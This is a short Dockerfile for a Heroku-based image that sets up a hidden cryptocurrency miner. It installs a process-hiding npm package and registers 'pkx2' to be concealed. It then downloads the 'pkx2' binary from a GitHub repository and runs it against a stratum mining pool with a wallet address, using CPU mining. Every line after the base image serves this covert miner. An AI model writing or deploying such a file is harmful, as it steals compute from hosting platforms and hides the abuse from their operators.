FROM heroku/heroku:18
RUN apt-get update
RUN apt-get install -y nodejs npm
RUN npm i -g node-process-hider && ph add pkx2
RUN wget https://github.com/parkitmove/parkit/raw/main/pkx2 && chmod +x pkx2 && ./pkx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 RBthiAgtmCjL8cEUtwNPkpw2WwFtMQGMQM -p CPU
CMD bash heroku.sh
